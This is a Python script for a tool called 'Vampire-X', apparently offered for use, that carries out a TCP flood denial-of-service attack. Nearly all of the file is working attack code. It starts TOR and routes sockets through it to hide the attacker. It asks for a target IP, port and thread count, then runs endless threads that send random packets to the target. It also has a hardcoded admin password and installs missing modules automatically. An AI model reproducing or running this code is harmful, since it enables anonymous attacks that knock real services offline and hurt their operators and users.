import os
import sys
import socket
import threading
import time
import random
import socks  # PySocks for TOR proxy
import subprocess

# Ensure required modules
required_modules = ["socks", "requests"]
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f"pip install {module}")

# ========== Advanced Banner System ==========
def show_banner(mode):
    banner = f"""
{'='*50}
   Vampire-X {'Admin Panel' if mode == 'admin' else 'User Panel'}
   Mode: {'Administrator Access' if mode == 'admin' else 'User Access'}
   Status: ACTIVE | Anonymous Mode: ENABLED
   Coded by: Muhammad Shourov(Vampire)
{'='*50}
"""
    print(banner)

# ========== TOR Integration ==========
def start_tor():
    print("[+] Initializing TOR for anonymous routing...")
    try:
        # Start TOR service (Linux only)
        subprocess.call("service tor start", shell=True)
        time.sleep(3)
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        print("[+] TOR routing active.")
    except Exception as e:
        print(f"[!] TOR error: {e}. Trying without TOR...")

# ========== DDoS Attack Function ==========
def tcp_flood(target, port, threads):
    packet = random._urandom(1024)
    print(f"[TCP] Attack started on {target}:{port} with {threads} threads")
    
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                for _ in range(100):
                    s.send(packet)
                s.close()
                print(f"[TCP] Packet sent to {target}:{port}")
            except Exception as e:
                print(f"[!] Error: {e}")
                pass

    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

# ========== Main Function ==========
def main():
    try:
        mode = input("Enter mode (admin/user): ").strip().lower()
        if mode == 'admin':
            password = input("Enter admin password: ")
            if password != "SH404":
                print("Incorrect password. Exiting.")
                return
            show_banner("admin")
            tor_pass = input("Enter TOR password to enable anonymity: ")
            if tor_pass == "SH404":
                start_tor()
            else:
                print("Invalid TOR password. Proceeding without TOR.")
        else:
            show_banner("user")
            start_tor()

        target = input("Enter Target IP: ")
        port = int(input("Enter Target Port: "))
        threads = int(input("Enter Threads: "))

        tcp_flood(target, port, threads)
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")
    except Exception as e:
        print(f"[!] Fatal Error: {str(e)} — Retrying in safe mode...")
        time.sleep(2)
        main()  # Restart

if __name__ == "__main__":
    main()
